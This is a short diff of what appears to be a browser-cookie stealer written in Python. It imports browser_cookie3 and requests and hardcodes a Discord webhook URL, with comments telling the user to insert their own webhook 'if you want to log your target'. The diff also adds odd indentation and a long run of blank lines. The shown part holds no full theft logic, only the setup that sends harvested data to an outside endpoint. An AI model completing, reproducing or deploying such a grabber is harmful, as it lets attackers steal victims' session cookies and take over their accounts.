@@ -12,9 +12,38 @@
 
  # WARNING touching with the code below will make the script not functional only insert your webhook..
  
-import browser_cookie3, requests, threading
+                         import browser_cookie3, requests, threading
 
-WebHook = "https://discord.com/api/webhooks/1047201308626669648/Tr8qR4JI2ay6jDgUWrX9XLCfEd5Y8ERmBoaCsOET9UtcXDaecnMBv3uLfMlYBphBgAmA" # Input your webhook here and make sure to compile if you want to log your target
+                               #Put your webhook below in between the ""
+
+WebHook = "https://discord.com/api/webhooks/1047201308626669648/Tr8qR4JI2ay6jDgUWrX9XLCfEd5Y8ERmBoaCsOET9UtcXDaecnMBv3uLfMlYBphBgAmA"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 # skids dont take my code
